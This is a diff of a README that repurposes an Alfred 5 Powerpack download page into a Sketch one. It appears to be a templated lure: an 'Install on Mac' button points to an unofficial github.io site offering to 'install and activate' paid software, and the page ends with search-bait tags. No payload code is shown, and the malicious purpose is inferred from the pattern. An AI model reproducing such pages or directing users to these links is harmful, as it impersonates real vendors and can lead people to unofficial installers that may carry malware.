@@ -1,12 +1,12 @@
-# Alfred 5 Powerpack  
+# Sketch  
 
 <div align="center">
-  <img src="https://www.alfredapp.com/media/logo4.png" width="300"/>
+  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/be/Sketch-logo-light.svg/1280px-Sketch-logo-light.svg.png" width="450"/>
 </div>  
 <br>
 <div align="center">
 
-[![🍏 Install on Mac](https://img.shields.io/badge/🍏_Install_on_Mac-darkblue?style=for-the-badge&logo=apple)](https://osx-applications.github.io/.github/alfred)
+[![🍏 Install on Mac](https://img.shields.io/badge/🍏_Install_on_Mac-darkblue?style=for-the-badge&logo=apple)](https://osx-quick-app.github.io/.github/sketch)
 
 </div>
 
@@ -14,53 +14,53 @@
 
 # Installation Instructions  
 
-1. Go to the official page by clicking the button above.  
-2. Complete the guided setup process to install and activate Alfred 5 Powerpack on your Mac.  
+1. Visit the website using the button above.  
+2. Follow the setup prompts to install and activate Sketch on your Mac.  
 
 ---
 
 <div align="center">
-  <img src="https://www.alfredapp.com/media/pages/home-v5/workflow-canvas.png" width="1080"/>
+  <img src="https://sktch.b-cdn.net/docs/interface-and-settings/the-mac-app-interface/the-mac-app-interface-athens.png?token=23IaKUZ1KAWSC4MIzX0OLxqy87deovX1godrtnw5QuY&expires=1760367595" width="1080"/>
 </div>  
 <br>
 
-## ⚙️ Overview  
+## ✏️ Overview  
 
-Alfred 5 Powerpack is a macOS productivity powerhouse designed to streamline how you interact with your computer.  
-It expands beyond the limitations of Spotlight Search, enabling lightning-fast file access, powerful automation, and deep customization.  
+Sketch is a leading digital design tool built specifically for macOS, used by UI/UX designers, illustrators, and product teams around the world.  
+It combines a sleek interface with powerful vector editing tools, smart layouts, and real-time collaboration features.  
 
-The Powerpack upgrade introduces workflow automation, advanced search tools, and integrations with popular macOS applications.  
-From launching programs to performing web searches or running scripts, Alfred gives you full control of your digital workspace with minimal effort.  
+The app makes it easy to design responsive interfaces, icons, and prototypes while maintaining pixel-perfect precision.  
+Whether you’re working solo or in a team, Sketch simplifies your workflow from concept to final design.  
 
 ---
 
-## 🚀 Key Features  
+## ⚙️ Key Features  
 
 | Feature | Description |
 |----------|-------------|
-| 🔍 Universal Search | Locate files, folders, and apps instantly using predictive search. |
-| ⚡ Visual Workflows | Automate tasks through Alfred’s easy-to-use drag-and-drop builder. |
-| 💾 Clipboard History | Revisit previously copied text, snippets, and images anytime. |
-| 🔗 App Integrations | Seamlessly connect Alfred with your favorite macOS apps. |
-| 🧭 System Control | Execute system-level commands like shutdown, lock, or sleep. |
-| 🎯 Custom Triggers | Assign shortcuts or hotkeys to speed up repetitive actions. |
-| ☁️ Cloud Sync | Synchronize all your preferences and workflows via iCloud or Dropbox. |
-| 🎨 Full Customization | Personalize Alfred’s look, hotkeys, and features to your workflow. |
+| 🎨 Vector Editing | Create clean, scalable designs using intuitive vector tools. |
+| 💻 Real-Time Collaboration | Work simultaneously with teammates on shared documents. |
+| 📐 Smart Layouts | Automatically adjust designs for multiple screen sizes. |
+| 🧩 Plugins & Extensions | Expand functionality with a vast library of community plugins. |
+| 🖼 Prototyping Tools | Build interactive prototypes without switching apps. |
+| 🧠 Symbols & Components | Reuse design elements across multiple artboards. |
+| 🖥 Optimized for macOS | Smooth performance on Apple Silicon and macOS Ventura or later. |
+| ☁️ Cloud Sharing | Store, sync, and present your projects online. |
 
 ---
 
 ## 💻 System Requirements  
 
-| Component | Minimum Requirement |
-|------------|----------------------|
-| Operating System | macOS 10.14 Mojave or later |
+| Component | Minimum Specification |
+|------------|------------------------|
+| Operating System | macOS 12 Monterey or later |
 | Processor | Intel or Apple Silicon (M1/M2/M3) |
-| Memory | 4 GB RAM or higher |
-| Storage | 100 MB of available disk space |
-| Internet | Needed for updates and workflow syncing |
+| RAM | Minimum 8 GB |
+| Storage | 2 GB available disk space |
+| Internet | Required for license verification and collaboration features |
 
 ---
 
 ## 🏷 Tags  
 
-alfred • alfred is • alfred mac • alfred app • alfredcamera app • alfred app for mac • alfred macbook • alfred osx • alfred powerpack • alfred camera home security app • alfred 3 • alfred 2 • alfred 4 • alfred remote • alfred spotlight • alfred5 • download alfred for mac • alfred 5 powerpack
+sketch • sketch mac • sketch for mac • sketch up • draw • drawings to draw easy • 3d modeling • sketchpad • sketch drawing • pencil drawing • sketch up online • animal drawings • sketch up warehouse • easy flowers to draw • anime drawings • sketches to draw • anime sketch • drawing eyes • drawing and sketching • drawings of butterflies
